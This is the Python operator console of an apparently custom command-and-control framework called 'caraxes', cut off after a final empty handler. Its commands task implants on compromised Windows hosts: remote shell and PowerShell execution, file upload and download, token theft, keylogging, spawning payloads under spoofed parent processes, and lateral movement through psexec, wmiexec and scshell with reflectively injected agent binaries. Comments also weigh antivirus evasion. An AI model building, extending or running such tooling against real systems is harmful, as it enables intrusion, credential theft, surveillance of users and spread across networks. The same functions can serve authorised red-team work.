"""
Interactive operator shell built on prompt_toolkit.

State machine with two contexts:
  - main: global commands (agents, listeners, modules, interact)
  - agent: agent-specific commands + module execution
"""

import asyncio
import logging
import re
import shlex
from datetime import datetime
from pathlib import Path
from typing import Optional

from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import FormattedText
from prompt_toolkit.history import FileHistory
from prompt_toolkit.patch_stdout import patch_stdout
from rich.console import Console



from .completer import ShellCompleter
from .themes import get_banner
from .commands.agents import cmd_agents
from .commands.listeners import cmd_listeners_list
from .commands.modules import cmd_modules_list, cmd_modules_search, cmd_module_help
from .commands.help import cmd_help
from .commands.generate import cmd_generate
from .commands.bof_import import cmd_bof_import

from ..core.session_manager import SessionManager, AgentSession
from ..core.task_manager import TaskManager
from ..core.module_registry import (
    ModuleRegistry, ModuleNotFoundError, IncompatibleError,
    ArgumentError, UserCancelled,
)
from ..core.events import event_bus, EventBus
from ..formatters.table import OutputParser
from ..listeners.base import BaseListener
from ..listeners.smb_listener import SmbListener
from ..logging.operator_logger import OperatorLogger
from ..protocol.commands import TaskType

log = logging.getLogger(__name__)
# Write to stderr to bypass prompt_toolkit's patch_stdout which corrupts
# ANSI escape sequences when writing to stdout during prompt_async.
console = Console(stderr=True)


class OperatorShell:
    """
    Interactive prompt_toolkit shell for the operator client.
    """

    def __init__(
        self,
        session_manager: SessionManager,
        task_manager: TaskManager,
        module_registry: ModuleRegistry,
        logger: OperatorLogger,
        history_file: Path = Path("./logs/.shell_history"),
    ):
        self.session_manager = session_manager
        self.task_manager = task_manager
        self.module_registry = module_registry
        self.logger = logger
        self.output_parser = OutputParser()

        self._context = "main"
        self._current_agent: Optional[AgentSession] = None
        self._listeners: dict[int, BaseListener] = {}
        self._running = True
        self._prompt_refresh_task: Optional[asyncio.Task] = None

        self._completer = ShellCompleter(module_registry, session_manager)

        history_file.parent.mkdir(parents=True, exist_ok=True)
        self._session = PromptSession(
            history=FileHistory(str(history_file)),
            completer=self._completer,
            complete_while_typing=True,
        )

        # Register event handlers
        event_bus.on(EventBus.AGENT_CHECKIN, self._on_agent_checkin)
        event_bus.on(EventBus.TASK_RESULT, self._on_task_result)

    def register_listener(self, listener: BaseListener):
        self._listeners[listener.listener_id] = listener
        self._completer.listeners = self._listeners

    def _next_listener_id(self) -> int:
        return max(self._listeners.keys(), default=0) + 1

    async def _cmd_listeners_start(self, args: list[str]):
        """
        Start a new listener.

        Usage:
          listeners start smb [--pipename <name>] [--host <ip>] [--name <alias>]
          listeners start https [--host <ip>] [--port <port>] [--name <alias>]
        """
        if not args:
            console.print(
                "[red]Usage: listeners start <type> [options][/red]\n"
                "[dim]  Types: smb, https\n"
                "  Options:\n"
                "    --pipename <name>   SMB pipe name (default: msagent_01)\n"
                "    --host <ip>         Bind address (default: 0.0.0.0)\n"
                "    --port <port>       Port for HTTPS (default: 443)\n"
                "    --name <alias>      Listener display name[/dim]"
            )
            return

        listener_type = args[0].lower()
        # Parse --key value pairs from remaining args
        opts = {}
        i = 1
        while i < len(args):
            if args[i].startswith("--") and i + 1 < len(args):
                opts[args[i][2:]] = args[i + 1]
                i += 2
            else:
                i += 1

        if listener_type == "smb":
            pipe_name = opts.get("pipename", "msagent_01")
            host = opts.get("host", "0.0.0.0")
            name = opts.get("name", "SMB")
            raw_port = int(opts.get("raw-port", 0))
            lid = self._next_listener_id()

            # Find RSA key from existing listeners or default path
            rsa_path = None
            for existing in self._listeners.values():
                if hasattr(existing, "_rsa_private_key") and existing._rsa_private_key:
                    rsa_path = getattr(existing, "_rsa_private_key_path", None)
                    break
            if not rsa_path:
                for candidate in [Path("keys/server_priv.pem"), Path("./keys/server_priv.pem")]:
                    if candidate.exists():
                        rsa_path = candidate
                        break

            listener = SmbListener(
                listener_id=lid,
                pipe_name=pipe_name,
                session_manager=self.session_manager,
                task_manager=self.task_manager,
                logger=self.logger,
                host=host,
                rsa_private_key_path=rsa_path,
                name=name,
                raw_port=raw_port,
            )
            try:
                await listener.start()
                self.register_listener(listener)
                console.print(
                    f"[green][+] SMB listener started[/green] "
                    f"(ID: {lid}, pipe: {pipe_name}, host: {host})"
                )
            except Exception as e:
                console.print(f"[red][-] Failed to start SMB listener: {e}[/red]")

        elif listener_type == "https":
            console.print(
                "[dim]HTTPS listeners are configured at startup via CLI args.\n"
                "  Use: python -m client.main --listen-port <port>[/dim]"
            )
        else:
            console.print(f"[red]Unknown listener type: {listener_type}[/red]")
            console.print("[dim]  Available types: smb, https[/dim]")

    def _get_prompt(self) -> FormattedText:
        if self._context == "main":
            return FormattedText([
                ("fg:ansired bold", "caraxes"),
                ("fg:ansibrightblack", " > "),
            ])

        agent = self._current_agent
        if not agent:
            return FormattedText([
                ("fg:ansired bold", "caraxes"),
                ("fg:ansibrightblack", " > "),
            ])

        # Integrity color — SYSTEM gets magenta, HIGH gets red
        int_style = "fg:ansiyellow"
        if agent.integrity == "SYSTEM":
            int_style = "fg:ansibrightmagenta bold"
        elif agent.integrity == "HIGH":
            int_style = "fg:ansired bold"

        # [IP@PID] label
        ip_str = agent.external_ip or "?"
        pid_str = str(agent.pid) if agent.pid else "?"

        return FormattedText([
            ("fg:ansired bold", "caraxes"),
            ("fg:ansibrightblack", " ["),
            ("fg:ansibrightgreen", f"{ip_str}"),
            ("fg:ansibrightblack", "@"),
            ("fg:ansibrightgreen", f"{pid_str}"),
            ("fg:ansibrightblack", "] "),
            ("fg:ansibrightblack", "("),
            ("fg:ansiwhite bold", f"{agent.hostname}"),
            ("fg:ansibrightblack", ") "),
            ("fg:ansibrightyellow", f"{agent.username}"),
            ("fg:ansibrightblack", " ["),
            (int_style, f"{agent.integrity}"),
            ("fg:ansibrightblack", "] "),
            ("fg:ansibrightblack", "["),
            ("fg:ansibrightblack", f"{agent.last_seen_ago}"),
            ("fg:ansibrightblack", "] "),
            ("fg:ansicyan", f"{agent.cwd}"),
            ("fg:ansibrightblack", " > "),
        ])

    async def run(self):
        """Main shell loop."""
        console.print(get_banner())
        console.print()

        # Startup info block — Sliver-style with bullet markers
        num_modules = len(self.module_registry.modules)
        num_listeners = len(self._listeners)
        console.print(f"  [bold bright_red]Jobs:[/bold bright_red] {num_listeners} listeners running")
        console.print(f"  [bold bright_red]Modules:[/bold bright_red] {num_modules} loaded")
        for lid, listener in self._listeners.items():
            info = listener.info()
            status = info["status"]
            s_style = "bold green" if status == "RUNNING" else "bold red"
            console.print(
                f"    [{s_style}]►[/{s_style}] {info['type']} "
                f"on {info.get('interface', '0.0.0.0')}:{info.get('port', '')} "
                f"[{s_style}]{status}[/{s_style}]"
            )
        console.print()

        while self._running:
            try:
                with patch_stdout():
                    text = await self._session.prompt_async(
                        self._get_prompt,
                    )

                text = text.strip()
                if not text:
                    continue

                if self._context == "main":
                    await self._handle_main(text)
                elif self._context == "agent":
                    await self._handle_agent(text)

            except KeyboardInterrupt:
                continue
            except EOFError:
                self._running = False
                break
            except Exception as e:
                console.print(f"[bold red]Error:[/] {e}")
                log.error(f"Shell error: {e}", exc_info=True)

        self._stop_prompt_refresh()
        console.print("[*] Shutting down...", style="yellow")

    async def _handle_main(self, text: str):
        """Handle commands in main context."""
        parts = shlex.split(text, posix=False)
        # Strip surrounding quotes that posix=False preserves
        parts = [p.strip('"').strip("'") for p in parts]
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd == "help":
            cmd_help("main")

        elif cmd == "agents":
            cmd_agents(self.session_manager)

        elif cmd == "interact":
            if not args:
                console.print("[red]Usage: interact <agent_id>[/red]")
                return
            try:
                display_id = int(args[0])
            except ValueError:
                console.print("[red]Agent ID must be a number.[/red]")
                return
            agent = self.session_manager.get_by_display_id(display_id)
            if not agent:
                console.print(f"[red]No agent with ID {display_id}.[/red]")
                return
            self._current_agent = agent
            self._context = "agent"
            self._completer.context = "agent"
            self._start_prompt_refresh()
            console.print(
                f"[bright_red][*][/bright_red] Active session: "
                f"[bold white]{agent.hostname}[/bold white] "
                f"([bright_yellow]{agent.username}[/bright_yellow])"
            )

        elif cmd == "listeners":
            if not args or args[0] == "list":
                cmd_listeners_list(self._listeners)
            elif args[0] == "start":
                await self._cmd_listeners_start(args[1:])
            elif args[0] in ("stop", "kill"):
                if len(args) < 2:
                    console.print("[red]Usage: listeners stop <id>[/red]")
                    return
                try:
                    lid = int(args[1])
                except ValueError:
                    console.print("[red]Listener ID must be a number.[/red]")
                    return
                listener = self._listeners.get(lid)
                if listener:
                    await listener.stop()
                    console.print(f"[yellow]Listener {lid} stopped.[/yellow]")
                else:
                    console.print(f"[red]No listener with ID {lid}.[/red]")
            else:
                console.print(f"[red]Unknown listeners subcommand: {args[0]}[/red]")

        elif cmd == "modules":
            if not args or args[0] == "list":
                cmd_modules_list(self.module_registry)
            elif args[0] == "search" and len(args) > 1:
                cmd_modules_search(self.module_registry, " ".join(args[1:]))
            else:
                console.print("[red]Usage: modules [list|search <query>][/red]")

        elif cmd == "generate":
            args_str = " ".join(args) if args else ""
            project_root = Path(__file__).parent.parent.parent
            cmd_generate(args_str, project_root, list(self._listeners.values()))

        elif cmd == "bof-import":
            # Register an external BOF into the module registry. Because
            # the completer and help panel both read registry.modules,
            # the imported command becomes tab-completable and
            # help-documented on the next prompt with no reload step.
            project_root = Path(__file__).parent.parent.parent
            cmd_bof_import(self.module_registry, args, project_root)

        elif cmd == "exit":
            self._running = False

        else:
            console.print(f"[red]Unknown command: {cmd}. Type 'help' for commands.[/red]")

    async def _handle_agent(self, text: str):
        """Handle commands in agent context."""
        parts = shlex.split(text, posix=False)
        # Strip surrounding quotes that posix=False preserves
        parts = [p.strip('"').strip("'") for p in parts]
        cmd = parts[0].lower()
        args = parts[1:]
        agent = self._current_agent

        if cmd == "back":
            self._current_agent = None
            self._context = "main"
            self._completer.context = "main"
            self._stop_prompt_refresh()
            return

        if cmd == "help":
            if args:
                mod = self.module_registry.get(args[0])
                if mod:
                    cmd_module_help(mod)
                else:
                    console.print(f"[red]Unknown module: {args[0]}[/red]")
            else:
                cmd_help("agent")
            return

        if cmd == "info":
            self._show_agent_info(agent)
            return

        if cmd == "modules":
            if not args or args[0] == "list":
                cmd_modules_list(self.module_registry)
            elif args[0] == "search" and len(args) > 1:
                cmd_modules_search(self.module_registry, " ".join(args[1:]))
            return

        if cmd == "sleep":
            if not args:
                console.print("[red]Usage: sleep <seconds> [jitter%][/red]")
                return
            try:
                interval = int(args[0])
                jitter = int(args[1].rstrip("%")) if len(args) > 1 else agent.jitter_percent
            except ValueError:
                console.print("[red]Invalid sleep/jitter value.[/red]")
                return
            agent.sleep_interval = interval
            agent.jitter_percent = jitter
            self.task_manager.create_task(
                agent, TaskType.CONFIG, "sleep",
                arguments=f"{interval}:{jitter}".encode(),
            )
            console.print(f"[green]Sleep set to {interval}s (jitter {jitter}%)[/green]")
            return

        if cmd == "clear":
            count = self.task_manager.clear_pending(agent)
            console.print(f"[yellow]Cleared {count} pending tasks.[/yellow]")
            return

        if cmd == "tasks":
            self._show_tasks(agent)
            return

        if cmd == "exit":
            self.task_manager.create_task(agent, TaskType.EXIT, "exit")
            console.print("[red]Exit task queued.[/red]")
            self._current_agent = None
            self._context = "main"
            self._completer.context = "main"
            self._stop_prompt_refresh()
            return

        if cmd == "steal_token":
            if not args:
                console.print("[red]Usage: steal_token <PID>[/red]")
                return
            pid_str = args[0]
            try:
                int(pid_str)
            except ValueError:
                console.print(f"[red]Invalid PID: {pid_str}[/red]")
                return
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "steal_token",
                arguments=pid_str.encode(),
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                "steal_token", {"pid": pid_str},
            )
            console.print(f"[green]Task queued: steal_token {pid_str}[/green]")
            return

        if cmd in ("shell", "powershell"):
            shell_cmd = " ".join(args)
            self.task_manager.create_task(
                agent, TaskType.NATIVE, cmd,
                arguments=shell_cmd.encode(),
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                cmd, {"command": shell_cmd},
            )
            console.print(f"[yellow]Task queued: {cmd} {shell_cmd}[/yellow]")
            return

        if cmd == "upload":
            if len(args) < 2:
                console.print("[red]Usage: upload <local> <remote>[/red]")
                return
            local_path = Path(args[0])
            if not local_path.exists():
                console.print(f"[red]Local file not found: {local_path}[/red]")
                return
            payload = local_path.read_bytes()
            remote_path = args[1]
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "upload",
                payload=payload,
                arguments=remote_path.encode(),
            )
            size = len(payload)
            console.print(f"[green]Upload queued: {local_path.name} ({size}B) -> {remote_path}[/green]")
            return

        if cmd == "download":
            if not args:
                console.print("[red]Usage: download <remote> [local][/red]")
                return
            remote_path = args[0]
            local_save = args[1] if len(args) > 1 else ""
            # Store the intended local path so we can use it when result arrives
            task = self.task_manager.create_task(
                agent, TaskType.NATIVE, "download",
                arguments=remote_path.encode(),
            )
            task._download_remote = remote_path
            task._download_local = local_save
            console.print(f"[green]Download queued: {remote_path}[/green]")
            return

        if cmd == "bof":
            if not args:
                console.print("[red]Usage: bof <path.o> [args...][/red]")
                return
            bof_path = Path(args[0])
            if not bof_path.exists():
                console.print(f"[red]BOF file not found: {bof_path}[/red]")
                return
            payload = bof_path.read_bytes()
            bof_args = " ".join(args[1:]) if len(args) > 1 else ""
            self.task_manager.create_task(
                agent, TaskType.BOF, bof_path.stem,
                payload=payload,
                arguments=bof_args.encode() if bof_args else b"",
            )
            console.print(f"[green]BOF queued: {bof_path.name} ({len(payload)}B)[/green]")
            return

        if cmd == "assembly":
            if not args:
                console.print("[red]Usage: assembly <path.exe> [args...][/red]")
                return
            asm_path = Path(args[0])
            if not asm_path.exists():
                console.print(f"[red]Assembly not found: {asm_path}[/red]")
                return
            payload = asm_path.read_bytes()
            asm_args = " ".join(args[1:]) if len(args) > 1 else ""
            self.task_manager.create_task(
                agent, TaskType.ASSEMBLY, asm_path.stem,
                payload=payload,
                arguments=asm_args.encode() if asm_args else b"",
            )
            console.print(f"[green]Assembly queued: {asm_path.name} ({len(payload)}B)[/green]")
            return

        if cmd == "cd":
            cd_path = " ".join(args) if args else ""
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "cd",
                arguments=cd_path.encode() if cd_path else b"",
            )
            console.print(f"[green]Task queued: cd {cd_path}[/green]")
            return

        # spawnto — set sacrificial process for post-ex jobs
        if cmd == "spawnto":
            argstr = " ".join(args) if args else ""
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "spawnto",
                arguments=argstr.encode("utf-8") if argstr else b"",
            )
            if argstr:
                console.print(f"[green]Task queued: spawnto {argstr}[/green]")
            else:
                console.print("[green]Task queued: spawnto (show current config)[/green]")
            return

        # ppid — set parent PID for spawned processes
        if cmd == "ppid":
            argstr = args[0] if args else ""
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "ppid",
                arguments=argstr.encode("utf-8") if argstr else b"",
            )
            if argstr:
                console.print(f"[green]Task queued: ppid {argstr}[/green]")
            else:
                console.print("[green]Task queued: ppid (show current)[/green]")
            return

        # ak-settings — operator-friendly settings alias
        # Format: ak-settings spawnto_x64 <path>
        #         ak-settings spawnto_x86 <path>
        if cmd == "ak-settings":
            if not args:
                console.print(
                    "[yellow]Usage:[/yellow]\n"
                    "  ak-settings spawnto_x64 <path>\n"
                    "  ak-settings spawnto_x86 <path>"
                )
                return
            setting = args[0].lower()
            if setting in ("spawnto_x64", "spawnto_x86"):
                if len(args) < 2:
                    console.print(f"[red]Missing path for {args[0]}[/red]")
                    return
                arch = "x64" if "x64" in setting else "x86"
                path = " ".join(args[1:])
                argstr = f"{arch} {path}"
                self.task_manager.create_task(
                    agent, TaskType.NATIVE, "spawnto",
                    arguments=argstr.encode("utf-8"),
                )
                self.logger.log_command(
                    agent.agent_id, agent.hostname, agent.username,
                    "ak-settings", {"setting": setting, "value": path},
                )
                console.print(f"[green]Task queued: spawnto {argstr}[/green]")
            else:
                console.print(f"[red]Unknown setting: {args[0]}[/red]\n"
                              "[dim]Available: spawnto_x64, spawnto_x86[/dim]")
            return

        # link — connect to child agent's SMB pipe
        if cmd == "link":
            if len(args) < 2:
                console.print(
                    "[red]Usage: link <target> <pipename>[/red]\n"
                    "[dim]  Example: link DUB-SQL-1 TSVCPIPE-4b2f70b3-ceba-42a5[/dim]"
                )
                return

            target, pipename = args[0], args[1]

            import struct
            host_bytes = target.encode("utf-8") + b"\x00"
            pipe_bytes = pipename.encode("utf-8") + b"\x00"
            packed = struct.pack("<I", len(host_bytes)) + host_bytes
            packed += struct.pack("<I", len(pipe_bytes)) + pipe_bytes

            self.task_manager.create_task(
                agent, TaskType.NATIVE, "link",
                arguments=packed,
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                "link", {"target": target, "pipename": pipename},
            )
            console.print(
                f"[green]Task queued: link {target} via \\\\{target}\\pipe\\{pipename}[/green]"
            )
            return

        # unlink — disconnect linked child agent
        if cmd == "unlink":
            target_str = args[0] if args else ""
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "unlink",
                arguments=target_str.encode("utf-8") if target_str else b"",
            )
            if target_str:
                console.print(f"[green]Task queued: unlink {target_str}[/green]")
            else:
                console.print("[green]Task queued: unlink (list active links)[/green]")
            return

        # spawn — fork sacrificial process as new beacon
        if cmd == "spawn":
            if not args:
                console.print(
                    "[red]Usage: spawn <listener>[/red]\n"
                    "[dim]  Spawns a new beacon using the current spawnto/ppid config.[/dim]\n"
                    "[dim]  Tip: set spawnto/ppid before spawning.[/dim]"
                )
                return

            listener_name = args[0]

            # Validate listener (match by name, type, or ID)
            found_listener = None
            for lid, lst in self._listeners.items():
                info = lst.info()
                if (info.get("name", "").upper() == listener_name.upper()
                        or info["type"].upper() == listener_name.upper()
                        or str(info["id"]) == listener_name):
                    found_listener = lst
                    break
            if not found_listener:
                console.print(f"[red]Listener '{listener_name}' not found.[/red]")
                console.print("[dim]  Use 'listeners' to see available listeners.[/dim]")
                return
            if not found_listener.running:
                console.print(f"[red]Listener '{listener_name}' is not running.[/red]")
                return

            # Use the current agent's arch for the payload
            arch = agent.arch  # "x64" or "x86"
            project_root = Path(__file__).resolve().parent.parent.parent
            builds_dir = project_root / "builds"
            # Use raw (pre-crypter) PE for spawn — crypter adds a fragile
            # second reflective-load stage for zero benefit (payload never
            # touches disk, so on-disk AV evasion is pointless).
            agent_binary = builds_dir / f"agent_{arch}.raw.exe"
            if not agent_binary.exists():
                # Fall back to crypted binary if raw not available
                agent_binary = builds_dir / f"agent_{arch}.exe"
            if not agent_binary.exists():
                console.print(
                    f"[red]Agent binary not found: {agent_binary}[/red]\n"
                    f"[dim]  Run 'generate --arch {arch}' first.[/dim]"
                )
                return

            payload = agent_binary.read_bytes()
            payload_size_kb = len(payload) / 1024

            # Pack wire format: [4B payload_len][payload]
            import struct
            packed = struct.pack("<I", len(payload))
            packed += payload

            self.task_manager.create_task(
                agent, TaskType.NATIVE, "spawn",
                arguments=packed,
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                "spawn", {"listener": listener_name, "arch": arch},
            )
            console.print(
                f"[green]Task queued: spawn {listener_name} "
                f"({arch}, {payload_size_kb:.1f} KB payload)[/green]"
            )
            return

        # jump — lateral movement
        if cmd == "jump":
            if len(args) < 3:
                console.print(
                    "[red]Usage: jump <method> <target> <listener> [--server-connection][/red]\n"
                    "[dim]  Methods: psexec64 psexec32 wmiexec64 wmiexec32 scshell64 scshell32\n"
                    "  Default: child chains through parent via SMB pipe\n"
                    "  --server-connection: child connects directly to C2[/dim]"
                )
                return

            # Parse --server-connection flag (can be anywhere after method/target/listener)
            server_connection = "--server-connection" in args
            positional = [a for a in args if not a.startswith("--")]

            if len(positional) < 3:
                console.print(
                    "[red]Usage: jump <method> <target> <listener> [--server-connection][/red]"
                )
                return

            method_str, target, listener_name = positional[0].lower(), positional[1], positional[2]

            JUMP_METHODS = {
                "psexec64": (0, "x64"), "psexec32": (0, "x86"),
                "wmiexec64": (1, "x64"), "wmiexec32": (1, "x86"),
                "scshell64": (2, "x64"), "scshell32": (2, "x86"),
            }
            if method_str not in JUMP_METHODS:
                console.print(f"[red]Unknown method: {method_str}[/red]")
                console.print("[dim]  Valid: psexec64 psexec32 wmiexec64 wmiexec32 scshell64 scshell32[/dim]")
                return

            method_id, arch = JUMP_METHODS[method_str]

            # Validate listener exists and is running (match by name, type, or ID)
            found_listener = None
            for lid, lst in self._listeners.items():
                info = lst.info()
                if (info.get("name", "").upper() == listener_name.upper()
                        or info["type"].upper() == listener_name.upper()
                        or str(info["id"]) == listener_name):
                    found_listener = lst
                    break
            if not found_listener:
                console.print(f"[red]Listener '{listener_name}' not found.[/red]")
                console.print("[dim]  Use 'listeners' to see available listeners.[/dim]")
                return
            if not found_listener.running:
                console.print(f"[red]Listener '{listener_name}' is not running.[/red]")
                return

            # Find agent binary for this listener/arch
            project_root = Path(__file__).resolve().parent.parent.parent
            builds_dir = project_root / "builds"
            # Use raw (pre-crypter) PE — reflective injection, never touches disk
            agent_binary = builds_dir / f"agent_{arch}.raw.exe"
            if not agent_binary.exists():
                agent_binary = builds_dir / f"agent_{arch}.exe"
            if not agent_binary.exists():
                console.print(
                    f"[red]Agent binary not found: {agent_binary}[/red]\n"
                    f"[dim]  Run 'generate --arch {arch}' first.[/dim]"
                )
                return

            payload = agent_binary.read_bytes()
            payload_size_kb = len(payload) / 1024

            # Flags byte: bit 0 = server-connection
            flags = 0x01 if server_connection else 0x00

            # Build listener info string for --server-connection mode
            # For chained mode this is ignored (child uses PIPE:<name>)
            listener_info = ""
            listener_type = found_listener.info().get("type", "").upper()
            if server_connection and listener_type == "SMB":
                # Pass pipe name; child extracts C2 host from its own baked-in config
                smb_pipe = getattr(found_listener, "pipe_name", "")
                if smb_pipe:
                    listener_info = f"C2SMB:{smb_pipe}"
                else:
                    console.print("[red]SMB listener has no pipe name configured.[/red]")
                    return

            # Pack wire format:
            #   [1B method][1B flags][4B target_len][target\0]
            #   [4B listener_info_len][listener_info\0]
            #   [4B payload_len][payload]
            import struct
            target_bytes = target.encode("utf-8") + b"\x00"
            info_bytes = listener_info.encode("utf-8") + b"\x00" if listener_info else b"\x00"
            packed = struct.pack("<BB", method_id, flags)
            packed += struct.pack("<I", len(target_bytes))
            packed += target_bytes
            packed += struct.pack("<I", len(info_bytes))
            packed += info_bytes
            packed += struct.pack("<I", len(payload))
            packed += payload

            mode_str = "server-connection" if server_connection else "chained"
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "jump",
                arguments=packed,
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                "jump", {"method": method_str, "target": target,
                         "listener": listener_name, "mode": mode_str},
            )
            console.print(
                f"[green]Task queued: jump {method_str} {target} {listener_name} "
                f"({payload_size_kb:.1f} KB, {mode_str})[/green]"
            )
            return

        # dir — sends "ls" to agent, formatted as CMD dir output
        if cmd == "dir":
            dir_path = " ".join(args) if args else ""
            task = self.task_manager.create_task(
                agent, TaskType.NATIVE, "ls",
                arguments=dir_path.encode() if dir_path else b"",
            )
            task._display_cmd = "dir"
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                "dir", {"args": dir_path},
            )
            console.print(f"[green]Task queued: dir {dir_path}[/green]")
            return

        # Native agent modules (built into agent binary, no module.yaml)
        native_modules = {
            "systeminfo": {"desc": "System info (hostname, IP, OS, user, domain)", "args": False},
            "whoami": {"desc": "Current user, privileges, groups", "args": False},
            "ps": {"desc": "List running processes", "args": False},
            "ls": {"desc": "Directory listing", "args": True},
            "cat": {"desc": "Read file contents", "args": True},
            "keylogger": {"desc": "Keystroke logger (start|stop|dump)", "args": True},
            "rev2self": {"desc": "Revert to process token", "args": False},
        }
        if cmd in native_modules:
            native_args = " ".join(args) if args else ""
            self.task_manager.create_task(
                agent, TaskType.NATIVE, cmd,
                arguments=native_args.encode() if native_args else b"",
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                cmd, {"args": native_args},
            )
            console.print(f"[green]Task queued: {cmd}[/green]")
            return

        # Try as a registered module (BOF/Assembly with module.yaml)
        mod = self.module_registry.get(cmd)
        if mod:
            self._execute_module(agent, cmd, args)
            return

        console.print(f"[red]Unknown command or module: {cmd}[/red]")

    def _execute_module(self, agent, module_name, raw_args):
        """Parse module arguments and dispatch."""
        parsed_args = {}
        i = 0
        while i < len(raw_args):
            if raw_args[i].startswith("--"):
                key = raw_args[i][2:]
                if i + 1 < len(raw_args) and not raw_args[i + 1].startswith("--"):
                    parsed_args[key] = raw_args[i + 1]
                    i += 2
                else:
                    # Bare flag (no value) — use "1" for int-typed args, "true" otherwise
                    mod = self.module_registry.get(module_name)
                    if mod:
                        arg_def = next((a for a in mod.arguments if a.name == key), None)
                        if arg_def and getattr(arg_def, "pack_type", "") == "i":
                            parsed_args[key] = "1"
                        else:
                            parsed_args[key] = "true"
                    else:
                        parsed_args[key] = "true"
                    i += 1
            else:
                i += 1

        def confirm_opsec(name, notes):
            return True

        try:
            task = self.module_registry.dispatch(
                agent, module_name, parsed_args,
                confirm_opsec=confirm_opsec,
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                module_name, parsed_args,
            )
            console.print(f"[green]Task queued: {module_name} (id: {task.task_id[:8]})[/green]")
        except ModuleNotFoundError as e:
            console.print(f"[red]{e}[/red]")
        except IncompatibleError as e:
            console.print(f"[red]Compatibility error: {e}[/red]")
        except ArgumentError as e:
            console.print(f"[red]{e}[/red]")
        except UserCancelled:
            console.print("[yellow]Cancelled.[/yellow]")

    def _show_agent_info(self, agent):
        """Display detailed agent info."""
        info_lines = [
            f"Agent ID:      {agent.agent_id}",
            f"Display ID:    {agent.display_id}",
            f"Hostname:      {agent.hostname}",
            f"Username:      {agent.username}",
            f"External IP:   {agent.external_ip or '-'}",
            f"PID:           {agent.pid}",
            f"PPID:          {agent.ppid}",
            f"Process:       {agent.process_name}",
            f"Architecture:  {agent.arch}",
            f"OS:            {agent.os_version}",
            f".NET Version:  {agent.dotnet_version}",
            f"Integrity:     {agent.integrity}",
            f"Is Admin:      {agent.is_admin}",
            f"C2 Channel:    {agent.c2_channel}",
            f"Pipe Name:     {agent.pipe_name or '-'}",
            f"Sleep:         {agent.sleep_interval}s (jitter {agent.jitter_percent}%)",
            f"CWD:           {agent.cwd}",
            f"Agent Version: {agent.agent_version}",
            f"First Seen:    {agent.first_seen.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Last Seen:     {agent.last_seen.strftime('%Y-%m-%d %H:%M:%S')} ({agent.last_seen_ago} ago)",
            f"Pending Tasks: {len(agent.pending_tasks)}",
            f"Active Tasks:  {len(agent.active_tasks)}",
            f"Completed:     {len(agent.completed_tasks)}",
        ]
        _print("\n".join(info_lines))
        _print("")

    def _show_tasks(self, agent):
        """Display pending, active, and completed tasks for the agent."""
        # Pending
        if agent.pending_tasks:
            _print("\n  Pending Tasks")
            _print(f"  {'Module':<20} {'Type':<10} {'Created':<10} ID")
            _print(f"  {'-'*20} {'-'*10} {'-'*10} {'-'*8}")
            for task in agent.pending_tasks:
                _print(f"  {task.module_name:<20} {task.task_type.name:<10} "
                       f"{task.created_at.strftime('%H:%M:%S'):<10} {task.task_id[:8]}")
        else:
            _print("  No pending tasks.")

        # Active (sent, awaiting result)
        if agent.active_tasks:
            _print("\n  Active Tasks")
            _print(f"  {'Module':<20} {'Type':<10} {'Sent':<10} {'Elapsed':<10} ID")
            _print(f"  {'-'*20} {'-'*10} {'-'*10} {'-'*10} {'-'*8}")
            for task in agent.active_tasks.values():
                elapsed = ""
                if task.sent_at:
                    secs = (datetime.utcnow() - task.sent_at).total_seconds()
                    elapsed = f"{int(secs)}s"
                sent = task.sent_at.strftime("%H:%M:%S") if task.sent_at else "?"
                _print(f"  {task.module_name:<20} {task.task_type.name:<10} "
                       f"{sent:<10} {elapsed:<10} {task.task_id[:8]}")
        else:
            _print("  No active tasks.")

        # Completed (last 20)
        completed = agent.completed_tasks[-20:]
        if completed:
            _print(f"\n  Completed Tasks (last {len(completed)})")
            _print(f"  {'Module':<20} {'Status':<10} {'Completed':<10} {'Duration':<10} ID")
            _print(f"  {'-'*20} {'-'*10} {'-'*10} {'-'*10} {'-'*8}")
            for task in reversed(completed):
                duration = ""
                if task.sent_at and task.completed_at:
                    dur = (task.completed_at - task.sent_at).total_seconds()
                    duration = f"{dur:.1f}s"
                comp = task.completed_at.strftime("%H:%M:%S") if task.completed_at else "?"
                _print(f"  {task.module_name:<20} {task.status.name:<10} "
                       f"{comp:<10} {duration:<10} {task.task_id[:8]}")
        else:
            _print("  No completed tasks.")

    def _invalidate_prompt(self):
        """Force prompt redraw so dynamic metadata (user, integrity) updates live."""
        try:
            app = self._session.app
            if app is not None:
                app.invalidate()
        except Exception:
            pass  # No running app — nothing to invalidate

    def _start_prompt_refresh(self):
        """Start a background task that invalidates the prompt every second
        so the last-seen timer ticks in real time."""
        self._stop_prompt_refresh()

        async def _tick():
            while True:
                await asyncio.sleep(1)
                self._invalidate_prompt()

        self._prompt_refresh_task = asyncio.ensure_future(_tick())

    def _stop_prompt_refresh(self):
        """Cancel the prompt refresh timer."""
        if self._prompt_refresh_task is not None:
            self._prompt_refresh_task.cancel()
            self._prompt_refresh_task = None

    def _on_agent_checkin(self, session, is_new):
        """Event handler for agent check-ins."""
        if is_new:
            _print(
                f"\n[*] Session #{session.display_id} opened -> "
                f"{session.hostname} ({session.username}) "
                f"- {session.external_ip or '?'} "
                f"- {session.os_version} - {session.arch} "
                f"[{session.integrity}] PID:{session.pid}"
            )
        # Refresh prompt if the current agent's metadata changed
        if self._current_agent and self._current_agent.agent_id == session.agent_id:
            self._invalidate_prompt()

    def _on_task_result(self, session, task):
        """Event handler for task results."""
